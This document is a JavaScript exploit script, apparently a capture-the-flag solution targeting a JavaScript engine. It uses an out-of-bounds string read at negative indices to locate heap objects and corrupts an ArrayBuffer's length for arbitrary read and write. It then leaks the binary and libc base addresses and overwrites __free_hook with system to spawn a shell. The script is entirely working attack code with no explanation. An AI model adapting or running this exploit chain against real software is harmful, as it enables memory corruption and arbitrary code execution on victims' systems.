function gc() { for (let i = 0; i < 0x10; i++) new ArrayBuffer(0x1000000);}

var tarr = new BigUint64Array(8);
tarr[0] = 0x33313131n;
tarr[1] = 0x32323232n;

var ab = []
for (var i = 0; i < 0x200; i++) {ab.push(new ArrayBuffer(0x1337));}
var oob_str_arr = ['AAAAAAAA','BBBBBBBB','CCCCCCCC']
gc();
gc();
console.log('[+] Locate relative postion of tarr')

var tarr_ix = 0;
for (var i = 0; i < 4000; i++) { if(oob_str_arr[0].charCodeAt(-1620000-i) == 0x33 & oob_str_arr[0].charCodeAt(-1620000-i-1) == 0x31& oob_str_arr[0].charCodeAt(-1620000-i-2) == 0x31& oob_str_arr[0].charCodeAt(-1620000-i-3) == 0x31){tarr_ix=i;};}
console.log(tarr_ix);
console.log('[+] Locate array buffer')

var ab_ix = 0;
for (var i = 0; i < 4000; i++) { if(oob_str_arr[0].charCodeAt(-1620000-i) == 0x13 & oob_str_arr[0].charCodeAt(-1620000-i-1) == 0x37){ab_ix=i;};}


console.log(ab_ix);

// 650 is the threshold calculate from running the code in debugger 
// weird 
diff = 650//tarr_ix-ab_ix;
console.log('[+] Difference : ')
console.log(diff)


tarr.fill(0x4000n,Math.floor(diff/8)-1,Math.floor(diff/8));

var corrupted_ix = 0;

console.log('[+] Now we corrupted one of the array size :)')
for (var i = 0; i < 0x200; i++){if (ab[i].byteLength!=0x1337){corrupted_ix =i;}};


var leak_base_offset = 0x1e90n 
var base_offset = 0x7fe2f0n 
var cxa = 0x1474718n

console.log('[+] Next we leak the mapped base ')


var up_byte = 0;
var lo_byte = 0;

for (var i = 0; i < 10000; i++) { if(oob_str_arr[0].charCodeAt(-1620000-i) == 0 & oob_str_arr[0].charCodeAt(-1620000-i-1) == 0& oob_str_arr[0].charCodeAt(-1620000-i-2) == 0& oob_str_arr[0].charCodeAt(-1620000-i-3) == 7& oob_str_arr[0].charCodeAt(-1620000-i+1) >0& oob_str_arr[0].charCodeAt(-1620000-i+2) >0) {up_byte = oob_str_arr[0].charCodeAt(-1620000-i+2); lo_byte = oob_str_arr[0].charCodeAt(-1620000-i+1) ; break;}}


var addr_space = BigInt(0x100000000*(lo_byte+(up_byte*0x100))); 

console.log(addr_space)

var leak_base = addr_space+leak_base_offset
tarr.fill(leak_base,Math.floor(diff/8),Math.floor(diff/8)+1);
var b64 = new BigUint64Array(ab[corrupted_ix])

var bin_base = b64[0] - base_offset
console.log(bin_base)

var cxa_handler = bin_base+cxa

console.log(cxa_handler)

tarr.fill(cxa_handler,Math.floor(diff/8),Math.floor(diff/8)+1);
var b64 = new BigUint64Array(ab[corrupted_ix])
gi_abort = b64[0]
local = 0x406c0n
remote = 0x25414n
libc_base = gi_abort-local 
free_hook = libc_base + 0x3ed8e8n // 0x1e75a8
system = libc_base + 0x4f440n // 0x52fd0
tarr.fill(free_hook,Math.floor(diff/8),Math.floor(diff/8)+1);

var b64 = new BigUint64Array(ab[corrupted_ix])
b64[0] = system
console.log('sh')
